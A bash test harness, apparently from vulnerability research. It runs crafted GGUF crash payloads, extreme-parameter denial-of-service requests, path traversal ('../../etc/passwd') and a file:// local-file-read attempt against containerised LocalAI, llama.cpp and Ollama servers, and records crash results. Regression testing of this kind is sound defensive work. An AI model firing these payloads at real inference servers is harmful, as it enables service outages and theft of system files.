#!/bin/bash
# ══════════════════════════════════════════════════════════════
# Full Cross-Framework Vulnerability Pattern Testing
# Tests ALL patterns from 68 CVEs against ALL 4 repos
# See CROSS_FRAMEWORK_PATTERNS.md for methodology
# ══════════════════════════════════════════════════════════════
set +e  # Don't abort on errors

DIR="$(cd "$(dirname "$0")" && pwd)"
LIMA_DIR="$DIR/.."
LOCALAI_PORT=11480
LLAMA_PORT=18080
OLLAMA_PORT=11460

RESULTS_FILE="$DIR/payloads/results.txt"
LOGS_DIR="$DIR/payloads/logs"
mkdir -p "$LOGS_DIR"
> "$RESULTS_FILE"

log_result() {
    local pattern="$1" framework="$2" test="$3" result="$4" detail="$5"
    echo "$pattern | $framework | $test | $result | $detail" >> "$RESULTS_FILE"
    echo "  [$result] $pattern/$test → $framework: $detail"
}

wait_for_service() {
    local url="$1" max_wait="$2" name="$3"
    for i in $(seq 1 "$max_wait"); do
        if curl -sf "$url" > /dev/null 2>&1; then
            echo "  $name ready (${i}s)"
            return 0
        fi
        sleep 1
    done
    echo "  ERROR: $name not ready after ${max_wait}s"
    return 1
}

# ──────────────────────────────────────────────────────────────
# Step 0: Generate all payloads
# ──────────────────────────────────────────────────────────────
echo "=============================================="
echo "Step 0: Generating all test payloads"
echo "=============================================="
python3 "$DIR/generate_all_payloads.py" "$DIR/payloads"
echo ""

# ╔══════════════════════════════════════════════════════════════╗
# ║  LOCALAI v3.12.1 — Test P1, P2, P8, P10, P11               ║
# ╚══════════════════════════════════════════════════════════════╝
echo "=============================================="
echo "FRAMEWORK: LocalAI v3.12.1"
echo "Patterns: P1 (narrow cast), P2 (heap overflow),"
echo "          P8 (recursion), P10 (null ptr), P11 (resource)"
echo "=============================================="

cd "$LIMA_DIR/localai-v3.12.1-retest"
docker compose up -d 2>/dev/null
if ! wait_for_service "http://localhost:$LOCALAI_PORT/readyz" 30 "LocalAI"; then
    log_result "ALL" "LocalAI" "startup" "SKIPPED" "Container failed to start"
else
    CONTAINER_LAI=localai-v3121-retest

    # ── P1: Integer Overflow / Narrow Casting → LocalAI ──
    echo ""
    echo "--- P1: Integer Overflow / Narrow Casting → LocalAI ---"

    for gguf in p1a_negative_key_length p1b_negative_array_count p1c_negative_value_length; do
        echo "  Testing $gguf..."

        # Copy GGUF to both possible model dirs
        docker cp "$DIR/payloads/${gguf}.gguf" $CONTAINER_LAI:/models/${gguf} 2>/dev/null
        docker cp "$DIR/payloads/${gguf}.gguf" $CONTAINER_LAI:/build/models/${gguf} 2>/dev/null

        # Create config YAML
        docker exec $CONTAINER_LAI sh -c "cat > /build/models/${gguf}.yaml << YAML
name: ${gguf}
backend: llama-cpp
YAML" 2>/dev/null

        RESP=$(curl -s -X POST "http://localhost:$LOCALAI_PORT/v1/chat/completions" \
            -H "Content-Type: application/json" \
            -d "{\"model\":\"${gguf}\",\"messages\":[{\"role\":\"user\",\"content\":\"test\"}]}" \
            --max-time 30 2>&1 || echo "TIMEOUT")
        sleep 2

        # Check logs for panic/crash
        PANIC=$(docker compose logs --tail 20 2>&1 | grep -ci "panic\|fatal\|SEGV\|SIGSEGV\|signal\|runtime error" || true)

        OOM=$(docker inspect $CONTAINER_LAI --format '{{.State.OOMKilled}}' 2>/dev/null || echo "false")
        RUNNING=$(docker inspect $CONTAINER_LAI --format '{{.State.Running}}' 2>/dev/null || echo "false")
        EXIT_CODE=$(docker inspect $CONTAINER_LAI --format '{{.State.ExitCode}}' 2>/dev/null || echo "0")

        if [ "$OOM" = "true" ] || [ "$RUNNING" = "false" ] || ! curl -sf "http://localhost:$LOCALAI_PORT/readyz" > /dev/null 2>&1; then
            log_result "P1" "LocalAI" "$gguf" "CRASHED" "Server crashed (OOM=$OOM exit=$EXIT_CODE)"
            docker compose up -d 2>/dev/null
            wait_for_service "http://localhost:$LOCALAI_PORT/readyz" 30 "LocalAI"
        elif [ "$PANIC" -gt 0 ]; then
            log_result "P1" "LocalAI" "$gguf" "PANIC_RECOVERED" "Go panic caught by recover()"
        else
            log_result "P1" "LocalAI" "$gguf" "NOT_VULNERABLE" "Server survived"
        fi
    done

    # ── P2: Heap Buffer Overflow → LocalAI ──
    echo ""
    echo "--- P2: Heap Buffer Overflow (GGUF) → LocalAI ---"

    for gguf in p2a_large_n_kv p2b_large_n_tensors p2c_small_vocab p2d_large_key_length; do
        echo "  Testing $gguf..."

        docker cp "$DIR/payloads/${gguf}.gguf" $CONTAINER_LAI:/models/${gguf} 2>/dev/null
        docker cp "$DIR/payloads/${gguf}.gguf" $CONTAINER_LAI:/build/models/${gguf} 2>/dev/null
        docker exec $CONTAINER_LAI sh -c "cat > /build/models/${gguf}.yaml << YAML
name: ${gguf}
backend: llama-cpp
YAML" 2>/dev/null

        RESP=$(curl -s -X POST "http://localhost:$LOCALAI_PORT/v1/chat/completions" \
            -H "Content-Type: application/json" \
            -d "{\"model\":\"${gguf}\",\"messages\":[{\"role\":\"user\",\"content\":\"test\"}]}" \
            --max-time 30 2>&1 || echo "TIMEOUT")
        sleep 2

        PANIC=$(docker compose logs --tail 20 2>&1 | grep -ci "panic\|fatal\|SEGV\|SIGSEGV\|signal\|runtime error" || true)

        # Check container state (OOMKilled, exit code)
        OOM=$(docker inspect $CONTAINER_LAI --format '{{.State.OOMKilled}}' 2>/dev/null || echo "false")
        EXIT_CODE=$(docker inspect $CONTAINER_LAI --format '{{.State.ExitCode}}' 2>/dev/null || echo "0")
        RUNNING=$(docker inspect $CONTAINER_LAI --format '{{.State.Running}}' 2>/dev/null || echo "false")

        if [ "$OOM" = "true" ]; then
            log_result "P2" "LocalAI" "$gguf" "CRASHED" "OOMKilled=true exit=$EXIT_CODE — GGUF triggered fatal OOM"
            docker compose up -d 2>/dev/null
            wait_for_service "http://localhost:$LOCALAI_PORT/readyz" 30 "LocalAI"
        elif [ "$RUNNING" = "false" ] || ! curl -sf "http://localhost:$LOCALAI_PORT/readyz" > /dev/null 2>&1; then
            log_result "P2" "LocalAI" "$gguf" "CRASHED" "Server crashed (exit=$EXIT_CODE)"
            docker compose up -d 2>/dev/null
            wait_for_service "http://localhost:$LOCALAI_PORT/readyz" 30 "LocalAI"
        elif [ "$PANIC" -gt 0 ]; then
            log_result "P2" "LocalAI" "$gguf" "PANIC_RECOVERED" "Go panic caught by recover()"
        else
            log_result "P2" "LocalAI" "$gguf" "NOT_VULNERABLE" "Server survived"
        fi
    done

    # ── P10: Null Pointer / Truncated → LocalAI ──
    echo ""
    echo "--- P10: Null Pointer / Truncated GGUF → LocalAI ---"

    for gguf in p10a_truncated_magic p10b_null_tensor_name p10c_truncated_after_header; do
        echo "  Testing $gguf..."

        docker cp "$DIR/payloads/${gguf}.gguf" $CONTAINER_LAI:/models/${gguf} 2>/dev/null
        docker cp "$DIR/payloads/${gguf}.gguf" $CONTAINER_LAI:/build/models/${gguf} 2>/dev/null
        docker exec $CONTAINER_LAI sh -c "cat > /build/models/${gguf}.yaml << YAML
name: ${gguf}
backend: llama-cpp
YAML" 2>/dev/null

        RESP=$(curl -s -X POST "http://localhost:$LOCALAI_PORT/v1/chat/completions" \
            -H "Content-Type: application/json" \
            -d "{\"model\":\"${gguf}\",\"messages\":[{\"role\":\"user\",\"content\":\"test\"}]}" \
            --max-time 30 2>&1 || echo "TIMEOUT")
        sleep 2

        PANIC=$(docker compose logs --tail 10 2>&1 | grep -ci "panic\|fatal\|SEGV\|SIGSEGV\|signal\|runtime error" || true)

        if ! curl -sf "http://localhost:$LOCALAI_PORT/readyz" > /dev/null 2>&1; then
            log_result "P10" "LocalAI" "$gguf" "CRASHED" "Server crashed"
            docker compose restart 2>/dev/null
            wait_for_service "http://localhost:$LOCALAI_PORT/readyz" 30 "LocalAI"
        elif [ "$PANIC" -gt 0 ]; then
            log_result "P10" "LocalAI" "$gguf" "PANIC_RECOVERED" "Go panic caught by recover()"
        else
            log_result "P10" "LocalAI" "$gguf" "NOT_VULNERABLE" "Server survived"
        fi
    done

    # ── P11: Resource Exhaustion → LocalAI ──
    echo ""
    echo "--- P11: Resource Exhaustion → LocalAI ---"

    for gguf in p11a_zero_alignment p11b_huge_dims p11c_zero_block_count; do
        echo "  Testing $gguf..."

        docker cp "$DIR/payloads/${gguf}.gguf" $CONTAINER_LAI:/models/${gguf} 2>/dev/null
        docker cp "$DIR/payloads/${gguf}.gguf" $CONTAINER_LAI:/build/models/${gguf} 2>/dev/null
        docker exec $CONTAINER_LAI sh -c "cat > /build/models/${gguf}.yaml << YAML
name: ${gguf}
backend: llama-cpp
YAML" 2>/dev/null

        RESP=$(curl -s -X POST "http://localhost:$LOCALAI_PORT/v1/chat/completions" \
            -H "Content-Type: application/json" \
            -d "{\"model\":\"${gguf}\",\"messages\":[{\"role\":\"user\",\"content\":\"test\"}]}" \
            --max-time 30 2>&1 || echo "TIMEOUT")
        sleep 2

        PANIC=$(docker compose logs --tail 10 2>&1 | grep -ci "panic\|fatal\|SEGV\|SIGSEGV\|signal\|runtime error\|divide.*zero\|division" || true)

        if ! curl -sf "http://localhost:$LOCALAI_PORT/readyz" > /dev/null 2>&1; then
            log_result "P11" "LocalAI" "$gguf" "CRASHED" "Server crashed"
            docker compose restart 2>/dev/null
            wait_for_service "http://localhost:$LOCALAI_PORT/readyz" 30 "LocalAI"
        elif [ "$PANIC" -gt 0 ]; then
            log_result "P11" "LocalAI" "$gguf" "PANIC_RECOVERED" "Go panic caught by recover()"
        else
            log_result "P11" "LocalAI" "$gguf" "NOT_VULNERABLE" "Server survived"
        fi
    done

    # ── P11d: Extreme API parameters → LocalAI ──
    echo ""
    echo "  Testing P11d: extreme API parameters..."
    RESP=$(curl -s -X POST "http://localhost:$LOCALAI_PORT/v1/chat/completions" \
        -H "Content-Type: application/json" \
        --max-time 15 \
        -d '{"model":"gpt-4","messages":[{"role":"user","content":"hi"}],"n":999999,"temperature":99999}' \
        2>&1 || echo "TIMEOUT")
    sleep 2
    if ! curl -sf "http://localhost:$LOCALAI_PORT/readyz" > /dev/null 2>&1; then
        log_result "P11" "LocalAI" "extreme_api_params" "CRASHED" "Server crashed on extreme params"
        docker compose restart 2>/dev/null
        wait_for_service "http://localhost:$LOCALAI_PORT/readyz" 30 "LocalAI"
    else
        log_result "P11" "LocalAI" "extreme_api_params" "NOT_VULNERABLE" "Server survived"
    fi

    # ── P5: Path Traversal → LocalAI ──
    echo ""
    echo "--- P5: Path Traversal → LocalAI ---"
    while IFS= read -r payload; do
        [ -z "$payload" ] && continue
        echo "  Testing: $payload"
        # Try via model name
        RESP=$(curl -s -X POST "http://localhost:$LOCALAI_PORT/v1/chat/completions" \
            -H "Content-Type: application/json" \
            --max-time 10 \
            -d "{\"model\":\"${payload}\",\"messages\":[{\"role\":\"user\",\"content\":\"test\"}]}" \
            2>&1 || true)
        # Check if response leaks file content
        if echo "$RESP" | grep -qi "root:.*:0:0\|shadow\|no such file\|permission denied\|is a directory"; then
            log_result "P5" "LocalAI" "model_name_traversal" "POSSIBLE" "Response contains file info: $(echo "$RESP" | head -c 100)"
        fi
    done < "$DIR/payloads/p5_traversal_payloads.txt"

    # Also try via /models/apply (known SSRF endpoint)
    RESP=$(curl -s -X POST "http://localhost:$LOCALAI_PORT/models/apply" \
        -H "Content-Type: application/json" \
        --max-time 10 \
        -d '{"url":"file:///etc/passwd"}' \
        2>&1 || true)
    if echo "$RESP" | grep -qi "root:.*:0:0\|shadow"; then
        log_result "P5" "LocalAI" "models_apply_lfi" "VULNERABLE" "LFI via file:// confirmed"
    else
        log_result "P5" "LocalAI" "models_apply_lfi" "NOT_VULNERABLE" "No file content leaked"
    fi

    # Collect all LocalAI logs
    docker compose logs > "$LOGS_DIR/localai_full.txt" 2>&1
fi

echo ""
echo "Stopping LocalAI..."
docker compose down 2>/dev/null

# ╔══════════════════════════════════════════════════════════════╗
# ║  LLAMA.CPP b8149 — Test P5, P7, P11                        ║
# ╚══════════════════════════════════════════════════════════════╝
echo ""
echo "=============================================="
echo "FRAMEWORK: llama.cpp b8149 (llama-server)"
echo "Patterns: P5 (path traversal), P7 (ReDoS),"
echo "          P9 (no auth), P11 (resource exhaustion)"
echo "=============================================="

# Check if llama-cpp grammar test environment exists
if [ -f "$LIMA_DIR/llama-cpp-b8149-fuzz/docker-compose.grammar.yml" ]; then
    cd "$LIMA_DIR/llama-cpp-b8149-fuzz"

    # Start container with llama-server
    docker compose -f docker-compose.grammar.yml up -d 2>/dev/null
    sleep 10

    CONTAINER_LLAMA=$(docker compose -f docker-compose.grammar.yml ps -q 2>/dev/null | head -1)

    if [ -z "$CONTAINER_LLAMA" ]; then
        echo "  ERROR: llama.cpp container not running"
        log_result "ALL" "llama-cpp" "startup" "SKIPPED" "Container not running"
    else
        # Start llama-server inside the container with the test model
        echo "  Starting llama-server inside container..."
        docker exec -d $CONTAINER_LLAMA sh -c '
            MODEL=""
            for f in /workspace/grammar_tests/stories260K.gguf /workspace/poc/*.gguf; do
                [ -f "$f" ] && MODEL="$f" && break
            done
            if [ -n "$MODEL" ]; then
                /usr/local/bin/llama-server \
                    -m "$MODEL" \
                    --host 0.0.0.0 --port 8080 \
                    -c 256 -n 32 \
                    > /tmp/llama_server.log 2>&1
            else
                echo "No model found at expected paths" > /tmp/llama_server.log
            fi
        ' 2>/dev/null

        # Wait for llama-server to be ready (model loading takes time)
        echo "  Waiting for llama-server to be ready..."
        SERVER_UP="no"
        for attempt in $(seq 1 30); do
            if docker exec $CONTAINER_LLAMA curl -sf http://127.0.0.1:8080/health > /dev/null 2>&1; then
                SERVER_UP="yes"
                echo "  llama-server ready after ${attempt}s"
                break
            fi
            sleep 1
        done

        if [ "$SERVER_UP" = "yes" ]; then
            echo "  llama-server running inside container"

            # ── P9: No Auth → llama-cpp ──
            echo ""
            echo "--- P9: No Authentication → llama-cpp ---"
            RESP=$(docker exec $CONTAINER_LLAMA curl -s http://127.0.0.1:8080/health 2>&1)
            if echo "$RESP" | grep -q "ok\|status"; then
                log_result "P9" "llama-cpp" "no_auth" "VULNERABLE" "API accessible without auth (by design)"
            fi

            # ── P11: Resource Exhaustion → llama-cpp ──
            echo ""
            echo "--- P11: Resource Exhaustion API params → llama-cpp ---"
            echo "  Testing extreme n_predict..."
            RESP=$(docker exec $CONTAINER_LLAMA curl -s -X POST http://127.0.0.1:8080/completion \
                -H "Content-Type: application/json" \
                -d '{"prompt":"hi","n_predict":999999999}' \
                --max-time 15 2>&1 || echo "TIMEOUT")
            sleep 2
            HEALTH=$(docker exec $CONTAINER_LLAMA curl -sf http://127.0.0.1:8080/health 2>/dev/null && echo "ok" || echo "dead")
            if [ "$HEALTH" = "dead" ]; then
                log_result "P11" "llama-cpp" "extreme_n_predict" "CRASHED" "Server died on extreme n_predict"
            else
                log_result "P11" "llama-cpp" "extreme_n_predict" "NOT_VULNERABLE" "Server survived"
            fi

            echo "  Testing n_predict=-1 (unlimited)..."
            RESP=$(docker exec $CONTAINER_LLAMA curl -s -X POST http://127.0.0.1:8080/completion \
                -H "Content-Type: application/json" \
                -d '{"prompt":"hi","n_predict":-1}' \
                --max-time 15 2>&1 || echo "TIMEOUT")
            sleep 2
            HEALTH=$(docker exec $CONTAINER_LLAMA curl -sf http://127.0.0.1:8080/health 2>/dev/null && echo "ok" || echo "dead")
            if [ "$HEALTH" = "dead" ]; then
                log_result "P11" "llama-cpp" "negative_n_predict" "CRASHED" "Server died on n_predict=-1"
            else
                log_result "P11" "llama-cpp" "negative_n_predict" "NOT_VULNERABLE" "Server survived"
            fi

            # ── P5: Path Traversal → llama-cpp ──
            echo ""
            echo "--- P5: Path Traversal → llama-cpp ---"
            # llama-server's /slots and other endpoints
            for path_payload in "../../etc/passwd" "../../../etc/passwd" "/etc/passwd"; do
                RESP=$(docker exec $CONTAINER_LLAMA curl -s "http://127.0.0.1:8080/${path_payload}" 2>&1 || true)
                if echo "$RESP" | grep -qi "root:.*:0:0"; then
                    log_result "P5" "llama-cpp" "url_path_traversal" "VULNERABLE" "Path traversal: $path_payload returned file content"
                    break
                fi
            done
            log_result "P5" "llama-cpp" "url_path_traversal" "NOT_VULNERABLE" "No file content leaked"

            # ── P7: ReDoS → llama-cpp ──
            echo ""
            echo "--- P7: ReDoS → llama-cpp ---"
            # llama-server doesn't have tool parsers like vLLM, but test grammar with regex-like patterns
            echo "  Testing grammar with repetitive patterns..."
            RESP=$(docker exec $CONTAINER_LLAMA curl -s -X POST http://127.0.0.1:8080/completion \
                -H "Content-Type: application/json" \
                --max-time 15 \
                -d '{"prompt":"hi","grammar":"root ::= [a-z]+ \" \" [a-z]+ \" \" [a-z]+","n_predict":10}' \
                2>&1 || echo "TIMEOUT")
            HEALTH=$(docker exec $CONTAINER_LLAMA curl -sf http://127.0.0.1:8080/health 2>/dev/null && echo "ok" || echo "dead")
            if [ "$HEALTH" = "dead" ]; then
                log_result "P7" "llama-cpp" "grammar_regex" "CRASHED" "Server died on regex-like grammar"
            else
                log_result "P7" "llama-cpp" "grammar_regex" "NOT_VULNERABLE" "Server survived"
            fi

        else
            echo "  llama-server failed to start (no model?)"
            docker exec $CONTAINER_LLAMA cat /tmp/llama_server.log 2>/dev/null | tail -5
            log_result "ALL" "llama-cpp" "server_start" "SKIPPED" "llama-server failed to start"
        fi

        # Collect logs
        docker exec $CONTAINER_LLAMA cat /tmp/llama_server.log > "$LOGS_DIR/llama_server.txt" 2>/dev/null
    fi

    docker compose -f docker-compose.grammar.yml down 2>/dev/null
else
    echo "  llama-cpp test environment not found, skipping"
    log_result "ALL" "llama-cpp" "environment" "SKIPPED" "No docker-compose found"
fi

# ╔══════════════════════════════════════════════════════════════╗
# ║  OLLAMA v0.17.0 — Test P11 (resource exhaustion via GGUF)  ║
# ╚══════════════════════════════════════════════════════════════╝
echo ""
echo "=============================================="
echo "FRAMEWORK: Ollama v0.17.0"
echo "Patterns: P11 (resource exhaustion via GGUF)"
echo "Note: P1/P2/P10 already confirmed in Ollama."
echo "      P8 tested — protected by Go json depth limit."
echo "=============================================="

cd "$LIMA_DIR/ollama-v0.17.0-retest"
docker compose up -d 2>/dev/null
if ! wait_for_service "http://localhost:$OLLAMA_PORT/api/version" 15 "Ollama"; then
    log_result "ALL" "Ollama" "startup" "SKIPPED" "Container failed to start"
else
    # ── P11: Resource Exhaustion → Ollama ──
    # CVE-2025-0317 (alignment=0), CVE-2025-0315 (huge dims), CVE-2024-8063 (block_count=0)
    # These are KNOWN Ollama CVEs — testing to confirm they still work on v0.17.0
    echo ""
    echo "--- P11: Resource Exhaustion GGUF → Ollama ---"

    for gguf in p11a_zero_alignment p11b_huge_dims p11c_zero_block_count; do
        echo "  Testing $gguf..."

        # Upload the crafted GGUF as a blob
        DIGEST="sha256:$(shasum -a 256 "$DIR/payloads/${gguf}.gguf" | cut -d' ' -f1)"
        curl -sf -X POST "http://localhost:$OLLAMA_PORT/api/blobs/$DIGEST" \
            -T "$DIR/payloads/${gguf}.gguf" \
            --max-time 10 2>/dev/null || true

        # Create model from the uploaded blob using v0.17.0 'files' API
        RESP=$(curl -s -X POST "http://localhost:$OLLAMA_PORT/api/create" \
            -H "Content-Type: application/json" \
            -d "{\"model\":\"${gguf}\",\"files\":{\"model.gguf\":\"${DIGEST}\"},\"stream\":false}" \
            --max-time 30 2>&1 || echo "TIMEOUT")
        sleep 2

        if ! curl -sf "http://localhost:$OLLAMA_PORT/api/version" > /dev/null 2>&1; then
            log_result "P11" "Ollama" "$gguf" "CRASHED" "Server crashed"
            docker compose restart 2>/dev/null
            wait_for_service "http://localhost:$OLLAMA_PORT/api/version" 15 "Ollama"
        elif echo "$RESP" | grep -qi "error\|panic"; then
            log_result "P11" "Ollama" "$gguf" "ERROR_RETURNED" "$(echo "$RESP" | head -c 150)"
        else
            log_result "P11" "Ollama" "$gguf" "NOT_VULNERABLE" "Server survived"
        fi
    done

    # Collect logs
    docker compose logs > "$LOGS_DIR/ollama_full.txt" 2>&1
fi

echo ""
echo "Stopping Ollama..."
docker compose down -v 2>/dev/null

# ╔══════════════════════════════════════════════════════════════╗
# ║  SUMMARY                                                    ║
# ╚══════════════════════════════════════════════════════════════╝
echo ""
echo "=============================================="
echo "CROSS-FRAMEWORK RESULTS SUMMARY"
echo "=============================================="
echo ""
echo "Format: Pattern | Framework | Test | Result | Detail"
echo "------------------------------------------------------"
cat "$RESULTS_FILE"
echo ""
echo "------------------------------------------------------"
echo ""

# Count results
TOTAL=$(wc -l < "$RESULTS_FILE" | tr -d ' ')
CRASHED=$(grep -c "CRASHED" "$RESULTS_FILE" || true)
PANIC=$(grep -c "PANIC_RECOVERED" "$RESULTS_FILE" || true)
VULN=$(grep -c "VULNERABLE" "$RESULTS_FILE" || true)
NOT_VULN=$(grep -c "NOT_VULNERABLE" "$RESULTS_FILE" || true)
SKIPPED=$(grep -c "SKIPPED" "$RESULTS_FILE" || true)

echo "Total tests: $TOTAL"
echo "  CRASHED:         $CRASHED"
echo "  PANIC_RECOVERED: $PANIC"
echo "  VULNERABLE:      $VULN"
echo "  NOT_VULNERABLE:  $NOT_VULN"
echo "  SKIPPED:         $SKIPPED"
echo ""

# Print previously confirmed results (not tested here)
echo "Previously confirmed (from earlier sessions):"
echo "  P1 → Ollama v0.17.0:    CRASHED (LIMA-NEW-001/002)"
echo "  P1 → llama-cpp b8149:   NOT_VULNERABLE (hardened)"
echo "  P2 → Ollama v0.17.0:    CRASHED (multiple CVEs)"
echo "  P2 → llama-cpp b8149:   NOT_VULNERABLE (hardened)"
echo "  P3 → vLLM:              VULNERABLE (7 pickle CVEs)"
echo "  P4 → LocalAI:           VULNERABLE (3 injection CVEs)"
echo "  P4 → llama-cpp:         VULNERABLE (Jinja2 SSTI)"
echo "  P4 → vLLM:              VULNERABLE (ZMQ + torch.load)"
echo "  P8 → llama-cpp b8149:   CRASHED (LIMA-NEW-003/004)"
echo "  P8 → Ollama v0.17.0:    NOT_VULNERABLE (Go json depth limit)"
echo "  P8 → vLLM:              CRASHED (3 xgrammar CVEs)"
echo "  P12 → LocalAI:          VULNERABLE (LIMA-NEW-006)"
echo "  P12 → Ollama:           NOT_VULNERABLE (no Sprig)"
echo ""
echo "Logs saved to: $LOGS_DIR/"
echo "Results saved to: $RESULTS_FILE"
echo ""
echo "Done."
